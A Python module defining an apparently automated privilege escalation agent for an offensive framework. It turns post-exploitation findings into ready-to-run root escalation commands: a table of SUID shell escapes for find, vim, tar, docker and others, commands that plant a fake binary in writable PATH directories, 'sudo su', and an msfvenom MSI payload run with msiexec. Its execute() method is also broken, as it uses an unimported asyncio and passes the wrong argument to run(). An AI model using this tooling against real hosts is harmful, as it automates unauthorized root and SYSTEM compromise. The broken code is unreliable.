import logging
from core.data_models import AgentData, Strategy
from typing import List
from core.logger import log
from core.data_models import PrivilegeEscalationReport, Strategy, PrivilegeEscalationVector, PostExFinding, AttackPhase, ErrorType
import json
import time
from core.context_manager import ContextManager # Import ContextManager

from core.base_agent import BaseAgent


class PrivilegeEscalationAgent(BaseAgent):
    supported_phases = [AttackPhase.ESCALATION]
    required_tools = []
    """
    An agent that analyzes post-exploitation data to find privilege escalation vectors.
    """

    def __init__(self, context_manager: ContextManager = None, orchestrator=None, **kwargs): # Changed shared_data to context_manager
        super().__init__(context_manager, orchestrator, **kwargs) # Pass context_manager to super
        self.report_class = PrivilegeEscalationReport

    async def run(self, strategy: Strategy, **kwargs) -> PrivilegeEscalationReport:
        """
        Analyzes the PostExReport to find potential privilege escalation vectors.
        """
        start_time = time.time()
        shell_id = strategy.context.get("shell_id")
        if not shell_id:
            end_time = time.time()
            return PrivilegeEscalationReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id="",
                errors=["Missing shell_id in context"],
                error_type=ErrorType.CONFIGURATION,
                summary="Privilege escalation analysis failed: Missing shell ID."
            )

        post_ex_report = await self.context_manager.get_context('post_ex_report') # Fetch from context_manager
        if not post_ex_report:
            end_time = time.time()
            return PrivilegeEscalationReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                shell_id=shell_id,
                errors=["PostExReport not found in context."],
                error_type=ErrorType.CONFIGURATION,
                summary="Privilege escalation analysis failed: PostExReport not found."
            )

        log.info(
            f"[PrivilegeEscalationAgent] Analyzing post-exploitation data for shell {shell_id}.")

        vectors = []
        for finding in post_ex_report.analysis: # Use post_ex_report
            if finding.type == "suid_binary":
                vector = await self._analyze_suid_binary(finding)
                if vector:
                    vectors.append(vector)
            elif finding.type == "writable_directory":
                vector = await self._analyze_writable_directory(finding)
                if vector:
                    vectors.append(vector)
            elif finding.type == "unquoted_service_path":
                vector = await self._analyze_unquoted_service_path(finding)
                if vector:
                    vectors.append(vector)
            elif finding.type == "sudo_nopasswd":
                vector = self._analyze_sudo_nopasswd(finding)
                if vector:
                    vectors.append(vector)
            elif finding.type == "always_install_elevated":
                vector = self._analyze_always_install_elevated(finding)
                if vector:
                    vectors.append(vector)

        summary = f"Found {len(vectors)} potential privilege escalation vectors."
        log.success(f"[PrivilegeEscalationAgent] {summary}")
        end_time = time.time()
        return PrivilegeEscalationReport(
            agent_name=self.__class__.__name__,
            start_time=start_time,
            end_time=end_time,
            shell_id=shell_id,
            potential_vectors=vectors,
            summary=summary
        )

    async def _analyze_suid_binary(self, finding: PostExFinding) -> PrivilegeEscalationVector | None:
        """Analyzes a SUID binary finding to see if it can be used for privilege escalation."""
        binary_path = finding.description.split(": ")[-1]
        binary_name = binary_path.split("/")[-1]

        # Check GTFOBins database
        gtfobins_url = f"https://gtfobins.github.io/gtfobins/{binary_name}/"
        
        # Comprehensive list of exploitable SUID binaries from GTFOBins
        exploitable_binaries = {
            "find": "find . -exec /bin/sh -p \\; -quit",
            "nmap": "nmap --interactive\nnmap> !sh",
            "vim": "vim -c ':py3 import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'\nvim -c ':!sh'",
            "bash": "bash -p",
            "cp": "cp /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p",
            "mv": "mv /bin/sh /tmp/sh && chmod +s /tmp/sh && /tmp/sh -p",
            "python": "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
            "python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
            "perl": "perl -e 'exec \"/bin/sh\";'",
            "ruby": "ruby -e 'exec \"/bin/sh\"'",
            "awk": "awk 'BEGIN {system(\"/bin/sh\")}'",
            "less": "less /etc/profile\n!sh",
            "more": "more /etc/profile\n!sh",
            "nano": "nano\n^R^X\nreset; sh 1>&0 2>&0",
            "tar": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
            "zip": "zip /tmp/test.zip /tmp/test -T --unzip-command='sh -c /bin/sh'",
            "git": "git help config\n!/bin/sh",
            "docker": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
        }
        
        if binary_name in exploitable_binaries:
            return PrivilegeEscalationVector(
                type="SUID_BINARY",
                details=f"The SUID binary '{binary_path}' can be exploited for privilege escalation.",
                command=exploitable_binaries[binary_name],
                confidence=0.95
            )
        
        # Check for partial matches (e.g., python2.7, python3.8)
        for key in exploitable_binaries:
            if key in binary_name.lower():
                return PrivilegeEscalationVector(
                    type="SUID_BINARY",
                    details=f"The SUID binary '{binary_path}' (variant of {key}) may be exploitable.",
                    command=exploitable_binaries[key],
                    confidence=0.85
                )
        
        return None

    async def _analyze_writable_directory(self, finding: PostExFinding) -> PrivilegeEscalationVector | None:
        """Analyzes a writable directory finding."""
        directory = finding.description.split(': ')[-1]
        
        # Check if directory is in common PATH locations
        high_value_paths = [
            "/usr/local/bin", "/usr/bin", "/bin", "/usr/sbin", "/sbin",
            "/usr/local/sbin", "/opt/bin", "/snap/bin"
        ]
        
        confidence = 0.5
        command = f"# Check if {directory} is in PATH\necho $PATH | grep -q {directory}\n"
        
        if any(directory.startswith(path) for path in high_value_paths):
            confidence = 0.9
            command += f"\n# Create malicious binary\ncat > {directory}/exploit << 'EOF'\n#!/bin/bash\n/bin/bash -p\nEOF\nchmod +x {directory}/exploit\n"
        else:
            command += f"\n# If in PATH, create malicious binary\ncat > {directory}/malicious << 'EOF'\n#!/bin/bash\n/bin/bash -p\nEOF\nchmod +x {directory}/malicious\n"
        
        return PrivilegeEscalationVector(
            type="WRITABLE_DIRECTORY",
            details=f"The directory '{directory}' is writable. If in PATH, can be used for privilege escalation via binary hijacking.",
            command=command,
            confidence=confidence
        )

    async def _analyze_unquoted_service_path(self, finding: PostExFinding) -> PrivilegeEscalationVector | None:
        """Analyzes an unquoted service path finding."""
        return PrivilegeEscalationVector(
            type="UNQUOTED_SERVICE_PATH",
            details=f"The service with path '{finding.description.split(': ')[-1]}' is unquoted and may be vulnerable to privilege escalation.",
            command="Attempt to place a malicious executable in the path to hijack the service.",
            confidence=0.8
        )

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute privilege escalation agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _analyze_sudo_nopasswd(self, finding: PostExFinding) -> PrivilegeEscalationVector:
        """Analyzes a sudo_nopasswd finding."""
        return PrivilegeEscalationVector(
            type="SUDO_NOPASSWD",
            details="User has NOPASSWD sudo access to all commands, allowing for instant privilege escalation.",
            command="sudo su",
            confidence=1.0
        )

    def _analyze_always_install_elevated(self, finding: PostExFinding) -> PrivilegeEscalationVector:
        """Analyzes an always_install_elevated finding."""
        return PrivilegeEscalationVector(
            type="ALWAYS_INSTALL_ELEVATED",
            details="The AlwaysInstallElevated registry keys are set, allowing any user to install MSI packages with SYSTEM privileges.",
            command="msfvenom -p windows/x64/exec CMD=\"cmd.exe /c whoami\" -f msi -o payload.msi; msiexec /quiet /qn /i payload.msi",
            confidence=1.0
        )
